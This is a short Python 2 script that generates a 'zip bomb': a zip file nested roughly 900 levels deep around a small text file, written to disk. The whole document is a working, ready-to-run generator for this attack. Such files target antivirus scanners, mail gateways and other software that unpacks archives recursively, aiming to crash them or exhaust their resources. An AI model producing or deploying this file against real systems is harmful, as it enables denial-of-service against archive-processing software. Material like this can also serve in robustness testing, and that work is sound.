import os, zipfile, StringIO

def GetZipWith(fname, content):
	fp = StringIO.StringIO()
	zf = zipfile.ZipFile(fp, "a", zipfile.ZIP_DEFLATED, False)
	zf.writestr(fname, content)
	zf.close()
	return fp.getvalue()

def CreateRecursiveZip(stack, fname, content):
	if stack:
		zipname = stack.pop()
		arcname, outer = CreateRecursiveZip(stack, fname, content)
		print "Adding '%s' to zipfile '%s' (%d bytes)" % (arcname, zipname, len(outer))
		return zipname, GetZipWith(zipname, outer)
	else:
		print "Creating '%s'" % fname
		return fname, GetZipWith(fname, content)

if __name__ == "__main__":

	depth = 900
	stack = ["stack%d.zip" % i for i in xrange(1,depth)]
	arcname, out = CreateRecursiveZip(stack, "needle.txt", "my data")
	print "Writing zip bomb to '%s'" % arcname
	file(arcname, "wb").write(out)
